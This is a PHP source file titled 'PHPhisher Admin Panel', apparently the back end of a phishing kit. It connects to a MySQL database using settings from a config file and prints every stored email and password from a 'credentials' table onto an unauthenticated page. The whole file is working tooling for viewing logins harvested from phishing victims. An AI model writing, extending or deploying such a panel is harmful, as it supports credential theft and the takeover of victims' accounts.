<?php
$json = json_decode(file_get_contents('../config.json'), true);
$username = $json['dbuser'];
$servername = $json['dbip'];
$password = $json['dbpass'];
$dbname = $json['dbname'];

echo '<!DOCTYPE html>'; 
echo '<html>';
echo '<head>';
echo '<link rel="stylesheet" href="../css/bootstrap.css">'; 
echo '<script src="../js/bootstrap.min.js"></script>'; 
echo '</head>'; 
echo '<body>'; 
echo '<div class="page-header">'; 
echo '<h1>PHPhisher Admin Panel </h1>'; 
echo '</div>'; 
echo '</body>'; 
echo '</html>'; 
// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if (!$conn) {
    die('Connection failed: ' . mysqli_connect_error());
}
$sql = 'SELECT id, email, password FROM credentials';
$result = mysqli_query($conn, $sql);
if (mysqli_num_rows($result) > 0) {
    // output data of each row
    while($row = mysqli_fetch_assoc($result)) {
        echo ' id: ' . $row['id']. ' - Email: <tr>' . $row['email']. ' - Password: ' . $row['password']. '<br>';
	}
} else {
    echo '0 results';
}

mysqli_close($conn);
?>